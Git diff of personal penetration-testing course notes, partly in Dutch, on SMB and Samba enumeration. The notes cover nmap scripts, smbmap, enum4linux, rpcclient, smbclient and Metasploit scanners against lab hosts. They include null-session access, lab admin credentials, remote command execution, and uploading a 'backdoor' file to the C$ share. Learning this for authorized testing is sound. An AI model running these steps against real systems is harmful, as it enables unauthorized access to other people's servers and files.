@@ -4,66 +4,52 @@
 
 **Server**:  it services something to a user, provides some sort of functionality that can be utilized by other devices. 
 - We pull resources from servers (e.g. email/files). 
-- Server can be runing windows, linux, macos. every computer can be a server 
+- Server can be running windows, linux, macOS. every computer can be a server 
 - servers need to be accessed remotely 
 
-Services (program on a computer that does a specific function) running on a server: 
-- require poning a listening port on the server and accepting connections remotly. 
-- open the barrier and allow access to programm remotely 
-- problem: misconfig or bugs that can give remote access to whole system 
+**Services**: program on a computer that does a specific function) running on a server: 
+- require a listening port on the server and accepting connections remotely. 
+- open the barrier and allow access to program remotely 
+- problem: misconfigure or bugs that can give remote access to whole system 
 
 
-Examples of services that you would see on a server 
+*Examples of services that you would see on a server* 
 
-#### SMB 
+#### SMB (445)
 - Windows file share implementation 
 - CIFS (generic version) works the same as SMB 
-- port 445 
 - NetBIOS sets up session for smb 
   
 SMB recon: 
 -  Run an nmap scan for open ports: `nmap -T4 ip/cidr --open `
-   Nmap ‘--open’ option would show only exposed ports of the live hosts
-  
-- Run scan for service enumeration on our OS: `nmap ip -sV -O`
-- `nmap {target ip} -sV -sC`  
-   helpful smb enumeration 
+   Nmap ‘`--open`’ option would show only exposed ports of the live hosts
+- Run scan for service enumeration on our OS: `nmap ip -sV -O` `nmap {target ip} -sV -sC`  
 - `net use` in powershell for smb ![[Pasted image 20230509105010.png]]
 
-SMB Discover and Mount 
-- Objective: Learn to use Nmap to scan the target machine and mount the SMB share of the target machine using the Windows File Explorer as well as using the command prompt.  Objective: Discover SMB share and mount it
+SMB Discover and Mount: 
+mount the SMB share of the target machine using the Windows File Explorer as well as using the command prompt
 
 ##### SMB: Nmap scripts
 
-- Once you establish the existence of the smb server now we proceed with enumeration which involves finding more info about the service (what can we learn from it and what can we do with it)
-- nmap has an scripting engine (see documentation of nmap)
-	- to use scripts we use: `--script {scriptname}`
-- stappenplan: 
+- nmap has an scripting engine (see documentation of nmap): `--script {scriptname}`
 
 1. ping target ip to check connection  
-   
 2.  run an nmap scan:  `nmap {target ip}`
-   
 3. check if it has smb (port 445 is open)
-   
 4. run an nmap scan just on the smb port 445 where we look at the smb protocol: `*nmap -p445 --script smb-protocols {target ip}*`
-   
-5. run an nmap scan just on smb port 445 where we check the securty mode:` *nmap -p445 --script smb-security-mode {target ip}*`
-   
+5. run an nmap scan just on smb port 445 where we check the security mode:` *nmap -p445 --script smb-security-mode {target ip}*`
 6. run an nmap scan where we enumerate a session: `*nmap -p445 --script smb-enum-sessions {target ip}*`
-	- smb-eum-sessions: geeft Nmap opdracht om het script smb-enum-sessions uit te voeren, wat informatie over actieve sessies in het SMB-protocol kan opleveren
-	  
 7. run the following nmap: `*nmap -p445 --script smb-enum-sessions --script-args* *smbusername={adminstrator}, smbpassword={smbserver_771} {target ip}*`
-	 - script-args: geeft argumenten door aan het smb-enum-sessions script, die specifiek zijn voor dat script. 
+	 - `script-args`: geeft argumenten door aan het smb-enum-sessions script, die specifiek zijn voor dat script. 
 	   
 8. run the following nmap command to enumerate the shares: `*nmap -p445 --script smb-enum-shares {target ip}* `
 	- gebruikt om de gedeelde bronnen te identificeren die beschikbaar zijn op een bepaalde host die SMB gebruikt op poort 445. SMB is een protocol dat wordt gebruikt voor het delen van bestanden en printers tussen computers op een netwerk.![[Pasted image 20230510145104.png]]
-	- ipc$ is usefull because it is a null session (anonymous session) where you can get in as a **guest** account but also utilize this session: IPC$ is een speciale gedeelde bron op computers die het SMB-protocol gebruiken. Het is een null sessie, wat betekent dat er geen inloggegevens vereist zijn om toegang te krijgen tot deze gedeelde bron. Het kan worden gebruikt door geautoriseerde gebruikers om verbinding te maken met het bestandssysteem en printers van de computer via het netwerk, zonder dat ze een geldige inlognaam of wachtwoord nodig hebben.  mogelijk is dat kwaadwillende gebruikers deze null sessie gebruiken om ongeautoriseerde toegang te krijgen tot de bronnen van een computer.
+	- `ipc$ `is usefull because it is a ***null session*** (anonymous session) where you can get in as a **guest** account but also utilize this session: Het kan worden gebruikt door geautoriseerde gebruikers om verbinding te maken met het bestandssysteem en printers van de computer via het netwerk, zonder dat ze een geldige inlognaam of wachtwoord nodig hebben. 
 	  
 9. Now run a command where we enumerate the shares after authenticating: `*nmap -p445  --script smb-enum-shares --script-args smbusername=administrator, smbpaswordsmbserver_771 {target ip}*`
    
 10. now enumerate the users to find out which users exist: `*nmap -p445 --script smb-enum-users --script-args smbusername=administrator smbpasword=smbserver_771 {target ip}*`  
-     (bult in accounts for guests en password does not expire = misconfiguration). De gastaccount is een ingebouwde account in Windows-besturingssystemen en is bedoeld voor gebruikers die de computer of het netwerk bezoeken zonder geldige inloggegevens te hebben. De account biedt beperkte toegang tot bepaalde bronnen, zoals bestanden en printers, en heeft geen wachtwoord nodig om toegang te krijgen
+     (bult in accounts for guests en password does not expire = misconfiguration). De gastaccount,. biedt beperkte toegang tot bepaalde bronnen, zoals bestanden en printers, en heeft geen wachtwoord nodig om toegang te krijgen
      
  11. run a command to look at server statistic: `*nmap -p445 --script smb-server-stats --script-arg smbusersname=administrator, smbpassword=smbserver_771 {target ip}*
      `
@@ -71,646 +57,133 @@ SMB Discover and Mount
      
  14. run command to check groups: `nmap -p445 --script smb-enum-groups --script-arg smbusername=adminsitrator, smbpassword=smbserver_771 {ip}* `
      
- 15. run command to check what services are running: `*`nmap -p445 --script smb-enum-services      --script-arg smbusername=adminsitrator, smbpassword=smbserver_771 {ip}*  ``
-
-		In dit geval verwijst 'services' naar de services of diensten die op de doelhost draaien en die worden aangeboden via het SMB (Server Message Block)-protocol op poort 445. Met de Nmap-opdracht wordt de script "smb-enum-services" gebruikt om informatie te verkrijgen over de services die op deze poort worden aangeboden, inclusief hun namen, statussen, types en de besturingselementen die ze accepteren. Deze informatie kan nuttig zijn voor beveiligingsdoeleinden, omdat het kan helpen bij he
-
+ 15. run command to check what services are running: 
+     ``nmap -p445 --script smb-enum-services   --script-arg smbusername=adminsitrator, smbpassword=smbserver_771 {ip}``
 
  16. run command to see what shares exist but also enumerate those shares: `*nmap -p445 --script smb-enum-shares,smb-ls      --script-arg smbusername=adminsitrator, smbpassword=smbserver_771 {ip}*  ` 
-	 - De opties "--script smb-enum-shares, smb-ls" specificeren dat twee scripts moeten worden uitgevoerd tijdens de scan: "smb-enum-shares" voor het vinden van gedeelde mappen en "smb-ls" voor het oplijsten van de inhoud van de gevonden mappen.
 	 - `smb-enum-shares`: This script will enumerate all the SMB shares on the target system.
 	-  `smb-ls`: This script will run the `ls` command on each share. Note that the `smb-ls` script requires authentication credentials for the target system. You can provide the credentials using the `smbusername` and `smbpassword` script arguments. For example:
-	
-##### SMB: SMBMap 
 
-1. ping the target ip to check if it is alive 
-   
-2. run an nmap scan: `*nmap {target ip}*`
-   
-3. run an script voor smb protocols: `*nmap -p445 --script smb-protocols {targetip}*`  this will tell us the procols and dialects. When we spot dialect SMBv1 which is dangerous we will use smbmap
-   
-4. Als je ziet dat versie 1 van smb gebruikt wordt dan gaan we een nullsession starten met volgende command: run smbmap voor smbv1: `smbmap -u guest -p "" -d . -H {target ip} `
+##### SMBMap 
+
+1. ping 
+2.  `nmap {target ip}`
+3. `nmap -p445 --script smb-protocols {targetip}`  this will tell us the procols and dialects. When we spot dialect SMBv1 which is dangerous we will use smbmap
+4. `smbmap -u guest -p "" -d . -H {target ip} `
 	- -   `-u guest`: gebruikt de gebruikersnaam "guest" om verbinding te maken met de host.
 	-   `-p ""`: stelt het wachtwoord in op een lege string, wat betekent dat er geen wachtwoord wordt gebruikt om verbinding te maken met de host.
 	-   `-d .`: stelt de domeinnaam in op "." (de huidige domeinnaam).
 	-   `-H {target ip}`: specificeert het IP-adres van de doel-SMB-host waarmee verbinding moet worden gemaakt.
-	- The results will be shares that the guest is able to connect to 
-	
-5. Try to run a command: `*smbmap -H {taget ip} -u administrator -p smbserver_771 -x 'ipconfig'*`
-	- De optie `-x` wordt gebruikt om een opdracht uit te voeren op de SMB-host nadat er verbinding is gemaakt. In dit geval wordt de opdracht 'ipconfig' uitgevoerd, die de netwerkconfiguratie van de host weergeeft.
-	  
-6. run a command to see a list of drives and folders: `*smbmap -H {taget ip} -u administrator -p 'smbserver_771' -L *`
-	- Door dit commando uit te voeren, krijg je een lijst van gedeelde mappen te zien die beschikbaar zijn op de opgegeven SMB-server met behulp van de opgegeven inloggegevens. 
-	-   -L: Deze optie instrueert smbmap om een lijst van gedeelde mappen op de SMB-server weer te geven.
 
-7. if there is a C$ we will try to connect with it using the following command:   `*smbmap -H {taget ip} -u Administrator -p 'smbserver_771' -r 'C$'*`
-	- Door dit commando uit te voeren, maak je verbinding met de opgegeven SMB-server met de opgegeven inloggegevens en krijg je toegang tot de inhoud van de 'C$' gedeelde map, waarbij je informatie kunt zien over de bestanden en mappen die zich op de systeemschijf van de SMB-server bevinden.
-	- -r 'C$ Deze optie geeft aan dat je toegang wilt krijgen tot de gedeelde map C$ op de SMB-server. 'C$' is een verborgen gedeelde map op Windows-systemen die meestal verwijst naar de systeemschijf (meestal de C-schijf)
+5.  `smbmap -H {taget ip} -u administrator -p smbserver_771 -x 'ipconfig'`
+6. `*smbmap -H {taget ip} -u administrator -p 'smbserver_771' -L *`
+7. if there is a `C$` : `smbmap -H {taget ip} -u Administrator -p 'smbserver_771' -r 'C$'`
 	  
 8. Lets try the following: 
-	1. create a file called backdoor: `*touch backdoor*  `check with ls to see if the file exist 
-	2.  run the following command: `smbmap -H {taget ip} -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor' `
-			--upload '/root/backdoor' C$ backdoor: This option is used to upload a file from the local machine to the remote server. It specifies the source file path (`/root/backdoor`) on the local machine and the destination file path (`C$\backdoor`) on the remote server. In this example, it is attempting to upload the file located at `/root/backdoor` to the `C:\backdoor` path on the remote server.
-	3. Now check if you successfully uploaded the file: `*smbmap -H {taget ip} -u Administrator -p 'smbserver_771' -r 'C$'*`
-		 - `-r 'C$'` specifies the share name to be enumerated, in this case, the "C$" administrative share.  ![[Pasted image 20230512152628.png]]
+	1. create a file `touch backdoor `
+	2.  `smbmap -H {taget ip} -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor' `
+	3. `*smbmap -H {taget ip} -u Administrator -p 'smbserver_771' -r 'C$'*`
 		 - If sucessfull then that means that you can upload a file. 
-		4. Check if you can download a file: `*smbmap -H {taget ip} -u Administrator -p 'smbserver_771' --download 'C$\{filename.extention}'* `
-		5. ls to see if download is complete 
-		6. read the file: `cat filename`
-
------------------ 
-
-LAB Windows recon: SMBMap   (deze nog een keer doen )
-
-Stappenplan SMBMap: 
-
-1.  Ping the target IP to check if it is alive. 
-	   Target is live ✔
+	4. download a file: `*smbmap -H {taget ip} -u Administrator -p 'smbserver_771' --download 'C$\{filename.extention}'* `
+	5.  `cat filename`
 
    
-2.  Run an nmap scan: `nmap {target ip}`. ✔
-		445/tcp   open  microsoft-ds  📍
-   
-3.  Run a script for SMB protocols: `nmap -p445 --script smb-protocols {target ip}`.
-   
-
-
-   ![[Pasted image 20230515161029.png]]
-   ![[Pasted image 20230515161051.png]]
-4.  Run smbmap for SMBv1: `smbmap -u guest -p "" -d . -H {target ip}`.
-   
-   
-5.  Try to run a command: `smbmap -H {target ip} -u administrator -p smbserver_771 -x 'ipconfig'`.
-   
-   
-6.  Run a command to see a list of drives and folders: `smbmap -H {target ip} -u administrator -p 'smbserver_771' -L`.
-
-   
-7.  If there is a C$ share, try to connect with it using the following command: `smbmap -H {target ip} -u Administrator -p 'smbserver_771' -r 'C$'`.
-
-
-8.  Let's try the following:
-    -   Create a file called backdoor: `touch backdoor` and check with `ls` to see if the file exists.
-    -   Run the following command to upload the file: `smbmap -H {target ip} -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor'`.
-    -   Check if the file was successfully uploaded: `smbmap -H {target ip} -u Administrator -p 'smbserver_771' -r 'C$'`.
-    -   Check if you can download a file: `smbmap -H {target ip} -u Administrator -p 'smbserver_771' --download 'C$\{filename.extension}'`.
-    -   Use `ls` to see if the download is complete.
-    -   Read the file: `cat filename`. 
-
-
 ####  SMB: Samba 1 
 
-- run `nmap` on target 
-- run service scan on open port to determine what the services are (standard nmap makes a guess based on the port number but service scan gives definite answer on the service)
-- run udp scan with `--top-port 25 --open` which mean that the top 25 port will be scanned that are open 
-- do service enumeration on open udp ports 
-- go back to enumeration on port 445: `nmap {target ip} -p 445 --script smb-os-discovery `
-- run: **msfconsole** 
-	- The `msfconsole` command is used to launch the Metasploit Framework console, which is a command-line interface (CLI) for the Metasploit Framework. The Metasploit Framework is a powerful open-source penetration testing tool used for developing and executing exploit code against target systems.
-	- When you run `msfconsole`, it starts the console and provides you with an interactive shell where you can interact with the various modules, exploits, payloads, and auxiliary tools available within the Metasploit Framework. From the console, you can search for and select exploits, configure payloads, set options, run scans, exploit vulnerabilities, and perform various other security testing tasks.
-	- Once the `msfconsole` is launched, you will see a command prompt where you can enter commands and interact with the Metasploit Framework.
-
+-  `nmap`  
+-  udp scan with `--top-port 25 --open` 
+-  service enumeration on open udp ports 
+- `nmap {target ip} -p 445 --script smb-os-discovery `
 
 	*msfconsole*
 		- `use auxiliary/scanner/smb/smb_version `
-				When you execute this command in the Metasploit console (msf5), it sets the context to the specified auxiliary module, which is designed to scan and identify the SMB (Server Message Block) version running on a target system.
-		- show options 
-		- set rhost {target ip }
-		- options (check if options are good)
-		- run or exploit 
-		- exit 
-
-
-
-*nmblookup -h* 
-- `*nmblookup -A {target IP}* `
-  Het nmblookup-commando is een hulpprogramma dat wordt gebruikt om NetBIOS-naamservers te bevragen om informatie te verkrijgen over NetBIOS-namen en hun bijbehorende IP-adressen. Door de optie -A te gebruiken, gevolgd door een doel-IP-adres, voert het commando een omgekeerde zoekopdracht uit om de NetBIOS-naam op te halen die is gekoppeld aan dat IP-adres. Samengevat, het commando nmblookup -A {doel-IP} haalt de NetBIOS-naam op die overeenkomt met het opgegeven doel-IP-adres door de NetBIOS-naamserver te bevragen.  
-	-    `<20>`: Represents the NetBIOS service type. In this case, `<20>` corresponds to the file-sharing service.
-	- `<group>`: Indicates that the NetBIOS name is a group name, rather than an individual computer name.
-	- `<active>`: Shows that the NetBIOS name is currently active.
-         `H`: Denotes that the device supports hybrid mode, which means it can communicate using both NetBIOS and DNS naming systems.
 	
+- `nmblookup -A {target IP} `
+   `nmblookup`- wordt gebruikt om NetBIOS-naamservers te bevragen om informatie te verkrijgen over NetBIOS-namen en hun bijbehorende IP-adressen. Door de optie `-A` te gebruiken,  voert het commando een omgekeerde zoekopdracht uit om de NetBIOS-naam op te halen die is gekoppeld aan dat IP-adres.  
+
 We see <20> that means we can try to connect to this for this we use: smbclient. 
 
-- `*smbclient -h* ` 
-- `*smbclient -L {targetip} -N*  `
-	- -   `smbclient`: Dit is de opdracht om een SMB-clientprogramma te starten.
-	-   `-L {targetip}`: Deze optie geeft aan dat je een lijst van gedeelde bronnen op een specifiek IP-adres wilt verkrijgen. 
-	-   `-N`: Deze optie schakelt de authenticatie uit, waardoor je geen gebruikersnaam en wachtwoord hoeft op te geven om verbinding te maken met de SMB-server. Hierdoor kun je de lijst van gedeelde bronnen verkrijgen zonder authenticatiegegevens.
+- `smbclient -h ` 
+- `smbclient -L {targetip} -N  `
+	-   `-N`: Deze optie schakelt de authenticatie uit
 
-When you see *IPC$* with a *null* session (A null session refers to an unauthenticated connection or session established between a client and a server without providing any credentials or authentication information.) then you might be able to connect to it 
+ *IPC$* with a *null* session: A null session refers to an unauthenticated connection or session established between a client and a server without providing any credentials
 
 - `rcpclient -h `
-- `*rpcclient -U "" -N {target ip}*`
+- `rpcclient -U "" -N {target ip}`
 	- `rpcclient`: Dit is de opdracht om een RPC-clientprogramma te starten
 	-   `-U ""`: Deze optie geeft aan dat je een lege gebruikersnaam ("") gebruikt om verbinding te maken. Hiermee wordt een null session geïnitieerd, wat betekent dat er geen expliciete gebruikersnaam wordt verstrekt voor authenticatie.
 	-   `-N`: Deze optie schakelt de authenticatie uit, waardoor er geen wachtwoord nodig is om verbinding te maken met de RPC-service.
-	-   `{target ip}`: Dit is het IP-adres van de doel-RPC-service waarmee verbinding moet worden gemaakt. Het moet worden vervangen door het werkelijke IP-adres. 
-
-
-
-
-LAB Samba Basics
-
-
-1.  Find the default tcp ports used by smbd.
-		   root@attackdefense:~# nmap 192.179.187.3
-
-2.  Find the default udp ports used by nmbd.
-		   root@attackdefense:~# nmap -sU  --top-port 25 --open  192.179.187.3
-   
-3.  What is the workgroup name of samba server?
-   
-		   root@attackdefense:~# nmap -sU -sV  --top-port 25 --open  192.179.187.3
-   
-4.  Find the exact version of samba server by using appropriate nmap script.
-   
-		root@attackdefense:~# nmap -p 445 --script smb-os-discovery 192.179.187.3
-	
-
-5.  Find the exact version of samba server by using smb_version metasploit module.
-		   `msf5 auxiliary(scanner/smb/smb_version) 
-	
-   
-6.  What is the NetBIOS computer name of samba server? Use appropriate nmap scripts.
-`root@attackdefense:~# nmap  --script smb-os-discovery.nse -p 445 ip `
-
-   
-7.  Find the NetBIOS computer name of samba server using nmblookup
-		   root@attackdefense:~# nmblookup -A 192.179.187.3
-
-   
-   
-   
-8.  Using smbclient determine whether anonymous connection (null session)  is allowed on the samba server or not.
-   `root@attackdefense:~# smbclient -L 192.179.187.3 -N`
-   
-9.  Using rpcclient determine whether anonymous connection (null session) is allowed on the samba server or not.
-`rpcclient -U "" -N target_ip `
 
 
 Stappenplan: 
 
--   Voer een nmap-scan uit op het doel: `nmap {targetip}`
--   Voer een servicescan uit op open poorten om te bepalen welke services actief zijn: `nmap -sV {targetip}`
--   Voer een UDP-scan uit op de top 25 open poorten: `nmap -sU --top-ports 25 --open {targetip}`
--   Voer een service-enumeratie uit op de open UDP-poorten: `nmap -sU -sV --top-ports 25 --open {targetip}`
--   Ga terug naar de enumeratie op poort 445 en voer smb-os-discovery-script uit: `nmap -p 445 --script smb-os-discovery {targetip}`
--   Start de Metasploit Framework-console met het commando `msfconsole`
--   Voer de volgende stappen uit in de Metasploit-console:
-    1.  Toon de beschikbare opties: `show options`
-    2.  Stel het doel-IP in: `set rhost {targetip}`
-    3.  Controleer of de opties correct zijn: `options`
-    4.  Voer de exploit uit: `run` of `exploit`
-    5.  Verlaat de Metasploit-console: `exit`
--   Voer `nmblookup -A {targetip}` uit om de NetBIOS-naam voor het opgegeven doel-IP op te halen.
--   Gebruik smbclient om verbinding te maken met de gevonden service. Voer `smbclient -L {targetip} -N` uit.
--   Gebruik `rpcclient -U "" -N {targetip}` om verbinding te maken met de RPC-service met een null session.
+-    `nmap {targetip}`
+-    `nmap -sV {targetip}`
+-   `nmap -sU --top-ports 25 --open targetip``
+-   `nmap -sU -sV --top-ports 25 --open targetip``
+-   `nmap -p 445 --script smb-os-discovery targetip``
+exploit in msfconsole 
+-   `nmblookup -A targetip} .
+-    `smbclient -L {targetip} -N` 
+-    `rpcclient -U "" -N targetip' 
 
 
 #####  SMB: Samba 2
 
-- Run service scan on open ports to identify samba 
-- run: `**rpcclient -U "" -N {Target ip}**`
-			- -   `-U ""`: Specifies an empty username for the connection.
-			-   `-N`: Instructs `rpcclient` to use a null session (i.e., without authentication).
-			-   `{Target ip}`: Placeholder for the IP address or hostname of the target system
-	- run: srvinfo (gives info about OS)  - exit 
-- run: `**enum4linux** -o {target ip}`
-	- "enum4linux": Dit is een tool die wordt gebruikt voor het enumereren van informatie over Windows- en Samba-systemen. Het voert verschillende opdrachten uit om informatie op te halen zoals gebruikerslijsten, groepslijsten, sharelijsten en andere details.
-	- Het "-o" argument wordt gebruikt om de verzamelde informatie op te slaan in een uitvoerbestand
-- run: ` **smbclient -L {target IP}** `
-- run: `**nmap {target} -p 445 --script smb-protocols** `
-- run:` **msfconsole** `
-	- use auxiliary/scanner/smb/smb2 
-	- set RHOSTS {target ip} 
-	- options 
-	- run 
-	- write the info you see 
-- run a script for enumerating users: `**nmap {ip} -p 445 --script smb-enum-users** `
-- run: `enum4linux -U {target}** `  (enum4linux -h for options) 
-- run: `rpcclient -U "" -N {Target ip}** `
+- `nmap`
+-  `rpcclient -U "" -N {Target ip}`
+- `enum4linux -o {target ip}`
+-  ` smbclient -L {target IP} `
+-  `nmap {target} -p 445 --script smb-protocols``
+- `msfconsole` -->  `use auxiliary/scanner/smb/smb2 
+-  `nmap {ip} -p 445 --script smb-enum-users `
+-  `enum4linux -U {target} `  
+-  `rpcclient -U "" -N {Target ip} `
 	- `enumdomusers` 
 	 - `lookupnames amin `
 
---------  LAB ---------- 
-
-
-Target ip: 192.65.249.3 
-
-Questions
-
-1.  Find the OS version of samba server using rpcclient.
-   
-	   	root@attackdefense:~# rpcclient -U "" -N 192.65.249.3
-
-2.  Find the OS version of samba server using enum4Linux.
-   
-		root@attackdefense:~# enum4linux -o 192.65.249.3
-
-   
-3.  Find the server description of samba server using smbclient.
-   
-		   root@attackdefense:~# smbclient -L 192.65.249.3
-		Enter WORKGROUP\GUEST's password: 
-		
-   
-4.  Is NTLM 0.12 (SMBv1) dialects supported by the samba server? Use appropriate nmap script.
-   
-		   root@attackdefense:~# nmap 192.65.249.3 -p 445 --script smb-protocols
-
-   
-   
-5.  Is SMB2 protocol supported by the samba server? Use smb2 metasploit module.
-   
-   
-		   msf5 auxiliary(scanner/smb/smb2) > run
-		
-
-		   
-   
-6.  List all users that exists on the samba server  using appropriate nmap script.
-
-` root@attackdefense:~# nmap 192.65.249.3 -p 445 --script smb-enum-users`
-
-   
-
-   
-7.  List all users that exists on the samba server  using smb_enumusers metasploit modules.
-   
-      
-		  msf5 auxiliary(scanner/smb/smb_enumusers) > run
-
-   
-   
-   
-8.  List all users that exists on the samba server using enum4Linux.
-   
-		   root@attackdefense:~# enum4linux -U 192.65.249.3
-
-
-   
-9.  List all users that exists on the samba server  using rpcclient.
-  
-		root@attackdefense:~# rpcclient -U "" -N 192.65.249.3
-
-
-
-   
-10.  Find SID of user “admin” using rpcclient.
-
-	rpcclient $> lookupnames admin
-
------
 
 #### SMB 3 
 
-- run to show shares: `**nmap {target ip} -p 445 --script smb-enum-shares** `
--  `**use auxiliary/scanner/smb/smb_enumshares** `
--  `**enum4linux -S {ip}** `
-- **smbclient -L {target} -N**   (-N = nullsession)
-- enum4linux -G {target}** 
-- **rpcclient -U "" -N {target}** 
-	- enumdomgroups
-- run: smbclient //target/Public -N 
-	- when you are in: hulp 
-	- ls en cd 
-
-
--- LAB --- 
-
-**target ip: 192.125.191.3**  
-
-Questions
-
-1.  List all available shares on the samba server using Nmap script.
-   
-		 root@attackdefense:~# nmap 192.125.191.3 -p 445 --script smb-enum-shares
-				Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 07:35 UTC
-				Nmap scan report for target-1 (192.125.191.3)
-				Host is up (0.000076s latency).
-		
-		PORT    STATE SERVICE
-		445/tcp open  microsoft-ds
-		MAC Address: 02:42:C0:7D:BF:03 (Unknown)
-		
-		Host script results:
-		| smb-enum-shares: 
-		|   account_used: guest
-		|   \\192.125.191.3\IPC$: 
-		|     Type: STYPE_IPC_HIDDEN
-		|     Comment: IPC Service (samba.recon.lab)
-		|     Users: 1
-		|     Max Users: <unlimited>
-		|     Path: C:\tmp
-		|     Anonymous access: READ/WRITE
-		|     Current user access: READ/WRITE
-		|   \\192.125.191.3\aisha: 
-		|     Type: STYPE_DISKTREE
-		|     Comment: 
-		|     Users: 0
-		|     Max Users: <unlimited>
-		|     Path: C:\samba\aisha
-		|     Anonymous access: <none>
-		|     Current user access: <none>
-		|   \\192.125.191.3\emma: 
-		|     Type: STYPE_DISKTREE
-		|     Comment: 
-		|     Users: 0
-		|     Max Users: <unlimited>
-		|     Path: C:\samba\emma
-		|     Anonymous access: <none>
-		|     Current user access: <none>
-		|   \\192.125.191.3\everyone: 
-		|     Type: STYPE_DISKTREE
-		|     Comment: 
-		|     Users: 0
-		|     Max Users: <unlimited>
-		|     Path: C:\samba\everyone
-		|     Anonymous access: <none>
-		|     Current user access: <none>
-		|   \\192.125.191.3\john: 
-		|     Type: STYPE_DISKTREE
-		|     Comment: 
-		|     Users: 0
-		|     Max Users: <unlimited>
-		|     Path: C:\samba\john
-		|     Anonymous access: <none>
-		|     Current user access: <none>
-		|   \\192.125.191.3\public: 
-		|     Type: STYPE_DISKTREE
-		|     Comment: 
-		|     Users: 0
-		|     Max Users: <unlimited>
-		|     Path: C:\samba\public
-		|     Anonymous access: READ/WRITE
-		|_    Current user access: READ/WRITE
-   
-   
-   
-   
-   
-2.  List all available shares on the samba server using smb_enumshares Metasploit module.
-
-		     msf5 auxiliary(scanner/smb/smb_enumshares) > exploit
-		
-		[+] 192.125.191.3:445     - public - (DS) 
-		[+] 192.125.191.3:445     - john - (DS) 
-		[+] 192.125.191.3:445     - aisha - (DS) 
-		[+] 192.125.191.3:445     - emma - (DS) 
-		[+] 192.125.191.3:445     - everyone - (DS) 
-		[+] 192.125.191.3:445     - IPC$ - (I) IPC Service (samba.recon.lab)
-		[*] 192.125.191.3:        - Scanned 1 of 1 hosts (100% complete)
-		[*] Auxiliary module execution completed
-
-
-
-   
-3.  List all available shares on the samba server using enum4Linux.
-   
-		   
-		root@attackdefense:~# enum4linux -S 192.125.191.3 
-		Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 16 07:40:24 2023
-		
-		 ========================== 
-		|    Target Information    |
-		 ========================== 
-		Target ........... 192.125.191.3
-		RID Range ........ 500-550,1000-1050
-		Username ......... ''
-		Password ......... ''
-		Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
-		
-		
-		 ===================================================== 
-		|    Enumerating Workgroup/Domain on 192.125.191.3    |
-		 ===================================================== 
-		[+] Got domain/workgroup name: RECONLABS
-		
-		 ====================================== 
-		|    Session Check on 192.125.191.3    |
-		 ====================================== 
-		[+] Server 192.125.191.3 allows sessions using username '', password ''
-		
-		 ============================================ 
-		|    Getting domain SID for 192.125.191.3    |
-		 ============================================ 
-		Domain Name: RECONLABS
-		Domain Sid: (NULL SID)
-		[+] Can't determine if host is part of domain or part of a workgroup
-		
-		 ========================================== 
-		|    Share Enumeration on 192.125.191.3    |
-		 ========================================== 
-		
-		        Sharename       Type      Comment
-		        ---------       ----      -------
-		        public          Disk      
-		        john            Disk      
-		        aisha           Disk      
-		        emma            Disk      
-		        everyone        Disk      
-		        IPC$            IPC       IPC Service (samba.recon.lab)
-		Reconnecting with SMB1 for workgroup listing.
-		
-		        Server               Comment
-		        ---------            -------
-		
-		        Workgroup            Master
-		        ---------            -------
-		        RECONLABS            SAMBA-RECON
-		
-		[+] Attempting to map shares on 192.125.191.3
-		//192.125.191.3/public  Mapping: OK, Listing: OK
-		//192.125.191.3/john    Mapping: DENIED, Listing: N/A
-		//192.125.191.3/aisha   Mapping: DENIED, Listing: N/A
-		//192.125.191.3/emma    Mapping: DENIED, Listing: N/A
-		//192.125.191.3/everyone        Mapping: DENIED, Listing: N/A
-		//192.125.191.3/IPC$    [E] Can't understand response:
-		NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
-		enum4linux complete on Tue May 16 07:40:24 2023
-   
-   
-   
-   
-4.  List all available shares on the samba server using smbclient.
-   
-		   root@attackdefense:~# smbclient -L 192.125.191.3 -N
-		
-		        Sharename       Type      Comment
-		        ---------       ----      -------
-		        public          Disk      
-		        john            Disk      
-		        aisha           Disk      
-		        emma            Disk      
-		        everyone        Disk      
-		        IPC$            IPC       IPC Service (samba.recon.lab)
-		Reconnecting with SMB1 for workgroup listing.
-		
-		        Server               Comment
-		        ---------            -------
-		
-		        Workgroup            Master
-		        ---------            -------
-		        RECONLABS            SAMBA-RECON
-   
-   
-   
-5.  Find domain groups that exist on the samba server by using enum4Linux.
-	   
-		   root@attackdefense:~# enum4linux -G 192.125.191.3
-		Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 16 07:58:24 2023
-		
-		 ========================== 
-		|    Target Information    |
-		 ========================== 
-		Target ........... 192.125.191.3
-		RID Range ........ 500-550,1000-1050
-		Username ......... ''
-		Password ......... ''
-		Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
-	
-		
-		 ===================================================== 
-		|    Enumerating Workgroup/Domain on 192.125.191.3    |
-		 ===================================================== 
-		[+] Got domain/workgroup name: RECONLABS 📍
-		
-		 ====================================== 
-		|    Session Check on 192.125.191.3    |
-		 ====================================== 
-		[+] Server 192.125.191.3 allows sessions using username '', password ''
-		
-		 ============================================ 
-		|    Getting domain SID for 192.125.191.3    |
-		 ============================================ 
-		Domain Name: RECONLABS
-		Domain Sid: (NULL SID)
-		[+] Can't determine if host is part of domain or part of a workgroup
-		
-		 =============================== 
-		|    Groups on 192.125.191.3    |
-		 =============================== 
-		
-		[+] Getting builtin groups:
-		
-		[+] Getting builtin group memberships:
-		
-		[+] Getting local groups:
-		group:[Testing] rid:[0x3f0]
-		
-		[+] Getting local group memberships:
-		
-		[+] Getting domain groups:
-		group:[Maintainer] rid:[0x3ee] 📍
-		group:[Reserved] rid:[0x3ef] 📍
-		
-		[+] Getting domain group memberships:
-		enum4linux complete on Tue May 16 07:58:24 2023
-	
-
-   
-   
-6.  Find domain groups that exist on the samba server by using rpcclient.
-   
-   
-		   root@attackdefense:~# rpcclient -U "" -N 192.125.191.3
-		rpcclient $> enumdomgroups
-		group:[Maintainer] rid:[0x3ee]
-		group:[Reserved] rid:[0x3ef]
-   
-   
-   
-   
-   
-   
-7.  Is samba server configured for printing?
-   
-   
-run: enum4linux -i {targetip} 
-   
-   
-   
-   
-   
-8.  How many directories are present inside share “public”?
-   
-		   root@attackdefense:~# smbclient //192.125.191.3/Public -N
-		Try "help" to get a list of possible commands.
-		smb: \> ls
